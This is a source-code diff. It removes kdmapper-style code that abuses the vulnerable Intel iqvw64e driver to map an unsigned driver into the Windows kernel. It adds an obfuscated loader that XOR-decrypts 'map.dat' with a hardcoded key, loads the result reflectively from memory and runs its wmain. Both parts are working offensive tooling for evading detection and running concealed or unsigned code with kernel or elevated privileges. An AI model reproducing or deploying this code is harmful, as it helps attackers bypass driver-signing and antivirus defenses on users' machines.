@@ -1,333 +1,87 @@
-#include "kdmapper.hpp"
+#include "moduleloader.h"
+#include "MetaString.h"
+#include "ObfuscatedCall.h"
+#include "ObfuscatedCallWithPredicate.h"
+#include <shlwapi.h>
+#include "uiaccess.h"
+#include <iostream>
+
+#pragma comment(lib, "shlwapi.lib")
+
+#pragma warning(disable: 4503)
+
+using namespace std;
+using namespace andrivet::ADVobfuscator;
 
 
-uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr) {
-	/*added by psec*/
-	LARGE_INTEGER LowAddress, HighAddress;
-	LowAddress.QuadPart = 0;
-	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;
+typedef void(*MAIN)(const int argc, wchar_t** argv);
 
-	uint64_t pages = (size / PAGE_SIZE) + 1;
-	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
-	if (!mdl) {
-		Log(L"[-] Can't allocate pages for mdl" << std::endl);
-		return { 0 };
-	}
-
-	uint32_t byteCount = 0;
-	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
-		Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
-		return { 0 };
-	}
-
-	if (byteCount < size) {
-		Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
-		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
-		intel_driver::FreePool(iqvw64e_device_handle, mdl);
-		return { 0 };
-	}
-
-	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
-	if (!mappingStartAddress) {
-		Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
-		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
-		intel_driver::FreePool(iqvw64e_device_handle, mdl);
-		return { 0 };
-	}
-
-	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
-	if (!result) {
-		Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
-		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
-		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
-		intel_driver::FreePool(iqvw64e_device_handle, mdl);
-		return { 0 };
-	}
-	Log(L"[+] Allocated pages for mdl" << std::endl);
-
-	if (mdlPtr)
-		*mdlPtr = mdl;
-
-	return mappingStartAddress;
-}
-
-uint64_t kdmapper::AllocIndependentPages(HANDLE device_handle, uint32_t size)
+void GetCurrentPath(char* path)
 {
-	const auto base = intel_driver::MmAllocateIndependentPagesEx(device_handle, size);
-	if (!base)
-	{
-		Log(L"[-] Error allocating independent pages" << std::endl);
-		return 0;
-	}
-
-	if (!intel_driver::MmSetPageProtection(device_handle, base, size, PAGE_EXECUTE_READWRITE))
-	{
-		Log(L"[-] Failed to change page protections" << std::endl);
-		intel_driver::MmFreeIndependentPages(device_handle, base, size);
-		return 0;
-	}
-
-	return base;
+	HMODULE hModule = GetModuleHandle(nullptr);
+	GetModuleFileNameA(hModule, path, MAX_PATH);
+	PathRemoveFileSpecA(path);
 }
 
-uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, AllocationMode mode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {
+int wmain(const int argc, wchar_t** argv)
+{
+	PrepareForUIAccess();
 
-	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);
+	//load coreloader
+	BYTE* key = NULL;
+	int keylen = 0;
+	BYTE keytemp[] = { 0x05, 0xA0, 0x23, 0x31, 0x24, 0x94, 0x2A, 0xE0, 0x26, 0x1B, 0x2E, 0xA5, 0xB7, 0x2C, 0xE9, 0xA9, 0x33, 0x04, 0x9D, 0x65, 0x5D, 0xC3, 0x63, 0xA0, 0x7E, 0xF7, 0xCA, 0x2D, 0xCC, 0xFF, 0x77, 0x5A, 0xD5, 0xFF, 0x5F, 0x4E, 0xFB, 0xB7, 0x0D, 0x8C, 0xD9, 0x02, 0xEA, 0x5D, 0x97, 0xF5, 0x06, 0x63, 0xC9, 0x6C, 0xEC, 0xCF, 0xBE, 0x7B, 0x99, 0xF8, 0xF3, 0xBA, 0x61, 0x8D, 0xBD, 0xCC, 0x4B, 0x09, 0x73, 0xC7, 0x12, 0x8D, 0x00, 0xC3, 0xC3, 0x0C, 0x8A, 0x55, 0x28, 0xD7, 0x62, 0xDE, 0xB5, 0x54, 0x16, 0xA3, 0x88, 0x76, 0xE3, 0x71, 0x90, 0x98, 0x76, 0x73, 0x82, 0x74, 0x20, 0x45, 0x83, 0x5E, 0x45, 0x5B, 0xFB, 0xB4, 0xCE, 0xD9, 0x73, 0xF2, 0xDD, 0x53, 0xB3, 0x87, 0x54, 0x63, 0x6F, 0xE5, 0x15, 0xAF, 0x6E, 0xEF, 0x77, 0x0B, 0x7E, 0xAC, 0x14, 0x81, 0xCB, 0x23, 0xA4, 0xA9, 0x42, 0x11, 0xF2, 0x7C, 0xA0, 0x85, 0x22, 0x06, 0x2C, 0xF4, 0x23, 0x3E, 0x25, 0x08, 0x42, 0xD0, 0xE2, 0x7B, 0x6E, 0x66, 0x89, 0x03, 0x0E, 0x70, 0x16, 0x93, 0xEE, 0x6F, 0x3F, 0x77, 0xE3, 0xE6, 0x7C, 0x39, 0x53, 0xAD, 0xFE, 0x7B, 0xAA, 0x54, 0x4F, 0x47, 0x8C, 0xEE, 0xE7, 0xAC, 0x54, 0xBC, 0x4C, 0xA8, 0xF9, 0x4C, 0x8F, 0x51, 0x37, 0x37, 0xF1, 0xCF, 0x04, 0xC0, 0x11, 0x04, 0x49, 0x2B, 0x87, 0x04, 0x20, 0x27, 0x40, 0x94, 0xE0, 0x01, 0x78, 0x08, 0xE0, 0x72, 0x6B, 0x21, 0x80, 0x00, 0x46, 0xB8, 0x37, 0xA9, 0x23, 0x6F, 0x9E, 0xD2, 0x11, 0x17, 0xD9, 0xB2, 0x60, 0x92, 0xFE, 0xF6, 0x51, 0x83, 0x7E, 0xF3, 0xCA, 0x75, 0x1E, 0x93, 0xB9, 0xF7, 0x7F, 0x7D, 0xFB, 0xFE, 0xEF, 0xD3, 0x4F, 0x79, 0xFD, 0x59, 0x7F, 0x61, 0xBA, 0x05, 0x0E, 0x79, 0xD8, 0x00, 0xC1, 0x10, 0x0A, 0x85, 0x87, 0x43, 0x96, 0xD3, 0xE0, 0x90, 0x5D, 0x10, 0xE6, 0xF0, 0x43, 0x2A, 0x5B, 0x04, 0x1C, 0x68, 0xF9, 0xC0, 0x11, 0x92, 0x4C, 0xA4, 0x50, 0x11, 0xDD, 0x22, 0x46, 0xB2, 0x5B, 0x5C, 0xCC, 0x6A, 0x09, 0xFD, 0x8F, 0x48, 0x8F, 0x60, 0xB3, 0x3A, 0xAD, 0xFA, 0x89, 0x7D, 0x3E, 0xDF, 0xA1, 0x27, 0x3F, 0xE9, 0x68, 0xD3, 0x93, 0x0F, 0x6C, 0xF2, 0x8B, 0xFD, 0x80, 0xFE, 0x45, 0x04, 0x50, 0xA5, 0x29, 0x01, 0x08, 0x90, 0x59, 0x4D, 0x21, 0x48, 0xD4, 0x6D, 0xF3, 0x22, 0x80, 0x87, 0x50, 0xD3, 0x6D, 0x58, 0x42, 0x11, 0x43, 0x48, 0x80, 0xE1, 0x24, 0x3A, 0x3F, 0x6F, 0x0B, 0xB7, 0x6F, 0xAF, 0xFB, 0x3D };
+	key = (BYTE*)malloc(sizeof(keytemp));
+	memcpy(key, keytemp, sizeof(keytemp));
+	keylen = sizeof(keytemp);
 
-	if (!nt_headers) {
-		Log(L"[-] Invalid format of PE image" << std::endl);
-		return 0;
-	}
+	//load encrypted code and run
+	char path[MAX_PATH] = { 0 };
+	OBFUSCATED_CALL(GetCurrentPath, path);
+	strcat_s(path, OBFUSCATED("\\map.dat"));
 
-	if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-		Log(L"[-] Image is not 64 bit" << std::endl);
-		return 0;
-	}
 
-	uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;
+	//read verify.dll
+	HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	if (!local_image_base)
-		return 0;
-
-	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
-	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);
-
-	uint64_t kernel_image_base = 0;
-	uint64_t mdlptr = 0;
-	if (mode == AllocationMode::AllocateMdl) {
-		kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
-	}
-	else if (mode == AllocationMode::AllocateIndependentPages) {
-		kernel_image_base = AllocIndependentPages(iqvw64e_device_handle, image_size);
-	}
-	else { // AllocatePool by default
-		kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
-	}
-
-	if (!kernel_image_base) {
-		Log(L"[-] Failed to allocate remote image in kernel" << std::endl);
-
-		VirtualFree(local_image_base, 0, MEM_RELEASE);
-		return 0;
-	}
-
-	do {
-		Log(L"[+] Image base has been allocated at 0x" << reinterpret_cast<void*>(kernel_image_base) << std::endl);
-
-		// Copy image headers
-
-		memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);
-
-		// Copy image sections
-
-		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);
-
-		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
-			if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
-				continue;
-			auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);
-			memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
-		}
-
-		uint64_t realBase = kernel_image_base;
-		if (destroyHeader) {
-			kernel_image_base -= TotalVirtualHeaderSize;
-			Log(L"[+] Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header" << std::endl);
-		}
-
-		// Resolve relocs and imports
-
-		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);
-
-		if (!FixSecurityCookie(local_image_base, kernel_image_base ))
+	if (INVALID_HANDLE_VALUE != hFile)
+	{
+		const DWORD dwSizeLow = GetFileSize(hFile, NULL);
+		PBYTE pbFile = (PBYTE)malloc(dwSizeLow);
+		if (NULL != pbFile)
 		{
-			Log(L"[-] Failed to fix cookie" << std::endl);
-			return 0;
-		}
-
-		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) {
-			Log(L"[-] Failed to resolve imports" << std::endl);
-			kernel_image_base = realBase;
-			break;
-		}
-
-		// Write fixed image to kernel
-
-		if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
-			Log(L"[-] Failed to write local image to remote image" << std::endl);
-			kernel_image_base = realBase;
-			break;
-		}
-
-		// Call driver entry point
-
-		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
-
-		Log(L"[<] Calling DriverEntry 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl);
-
-		if (callback) {
-			if (!callback(&param1, &param2, realBase, image_size, mdlptr)) {
-				Log(L"[-] Callback returns false, failed!" << std::endl);
-				kernel_image_base = realBase;
-				break;
-			}
-		}
-
-		NTSTATUS status = 0;
-		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
-			Log(L"[-] Failed to call driver entry" << std::endl);
-			kernel_image_base = realBase;
-			break;
-		}
-
-		if (exitCode)
-			*exitCode = status;
-
-		Log(L"[+] DriverEntry returned 0x" << std::hex << status << std::endl);
-
-		// Free memory
-		if (free) {
-			Log(L"[+] Freeing memory" << std::endl);
-			bool free_status = false;
-
-			if (mode == AllocationMode::AllocateMdl) {
-				free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
-				free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
-				free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
-			}
-			else if (mode == AllocationMode::AllocateIndependentPages)
+			DWORD dwRead = 0;
+			if (ReadFile(hFile, pbFile, dwSizeLow, &dwRead, NULL) && dwSizeLow == dwRead)
 			{
-				free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, realBase, image_size);
-			}
-			else {
-				free_status = intel_driver::FreePool(iqvw64e_device_handle, realBase);
-			}
+				//decrypt dll
 
-			if (free_status) {
-				Log(L"[+] Memory has been released" << std::endl);
-			}
-			else {
-				Log(L"[-] WARNING: Failed to free memory!" << std::endl);
-			}
-		}
+				int i = 0;
+				for (i = 0; i < dwRead; i++)
+				{
+					pbFile[i] = key[i % keylen] ^ pbFile[i];
+				}
 
-
-
-		VirtualFree(local_image_base, 0, MEM_RELEASE);
-		return realBase;
-
-	} while (false);
-
-
-	VirtualFree(local_image_base, 0, MEM_RELEASE);
-
-	Log(L"[+] Freeing memory" << std::endl);
-	bool free_status = false;
-
-	if (mode == AllocationMode::AllocateMdl) {
-		free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, kernel_image_base, mdlptr);
-		free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
-		free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
-	}
-	else if (mode == AllocationMode::AllocateIndependentPages)
-	{
-		free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, kernel_image_base, image_size);
-	}
-	else {
-		free_status = intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);
-	}
-
-	if (free_status) {
-		Log(L"[+] Memory has been released" << std::endl);
-	}
-	else {
-		Log(L"[-] WARNING: Failed to free memory!" << std::endl);
-	}
-
-	return 0;
-}
-
-void kdmapper::RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta) {
-	for (const auto& current_reloc : relocs) {
-		for (auto i = 0u; i < current_reloc.count; ++i) {
-			const uint16_t type = current_reloc.item[i] >> 12;
-			const uint16_t offset = current_reloc.item[i] & 0xFFF;
-
-			if (type == IMAGE_REL_BASED_DIR64)
-				*reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
-		}
-	}
-}
-
-// Fix cookie by @Jerem584
-bool kdmapper::FixSecurityCookie(void* local_image, uint64_t kernel_image_base)
-{
-	auto headers = portable_executable::GetNtHeaders(local_image);
-	if (!headers)
-		return false;
-
-	auto load_config_directory = headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
-	if (!load_config_directory)
-	{
-		Log(L"[+] Load config directory wasn't found, probably StackCookie not defined, fix cookie skipped" << std::endl);
-		return true;
-	}
-	
-	auto load_config_struct = (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
-	auto stack_cookie = load_config_struct->SecurityCookie;
-	if (!stack_cookie)
-	{
-		Log(L"[+] StackCookie not defined, fix cookie skipped" << std::endl);
-		return true; // as I said, it is not an error and we should allow that behavior
-	}
-
-	stack_cookie = stack_cookie - (uintptr_t)kernel_image_base + (uintptr_t)local_image; //since our local image is already relocated the base returned will be kernel address
-
-	if (*(uintptr_t*)(stack_cookie) != 0x2B992DDFA232) {
-		Log(L"[-] StackCookie already fixed!? this probably wrong" << std::endl);
-		return false;
-	}
-
-	Log(L"[+] Fixing stack cookie" << std::endl);
-
-	auto new_cookie = 0x2B992DDFA232 ^ GetCurrentProcessId() ^ GetCurrentThreadId(); // here we don't really care about the value of stack cookie, it will still works and produce nice result
-	if (new_cookie == 0x2B992DDFA232)
-		new_cookie = 0x2B992DDFA233;
-
-	*(uintptr_t*)(stack_cookie) = new_cookie; // the _security_cookie_complement will be init by the driver itself if they use crt
-	return true;
-}
-
-bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports) {
-	for (const auto& current_import : imports) {
-		ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
-		if (!Module) {
-#if !defined(DISABLE_OUTPUT)
-			std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
-#endif
-			return false;
-		}
-
-		for (auto& current_function_data : current_import.function_datas) {
-			uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);
-
-			if (!function_address) {
-				//Lets try with ntoskrnl
-				if (Module != intel_driver::ntoskrnlAddr) {
-					function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
-					if (!function_address) {
-#if !defined(DISABLE_OUTPUT)
-						std::cout << "[-] Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")" << std::endl;
-#endif
-						return false;
+				PLOADEDMODULE pModule = LoadModuleFromMemory(pbFile, dwRead);
+				if (NULL != pModule)
+				{
+					MAIN wmain = (MAIN)_GetProcAddress(pModule, OBFUSCATED("wmain"));
+					if (NULL != wmain)
+					{
+						try {
+							wmain(argc, argv);
+						}
+						catch (...) {
+							// Handle other exceptions from the DLL
+							// ...
+						}
 					}
+
+					FreeLibraryResources(pModule);
 				}
 			}
-
-			*current_function_data.address = function_address;
+			free(pbFile);
 		}
+		CloseHandle(hFile);
 	}
-
-	return true;
 }
+
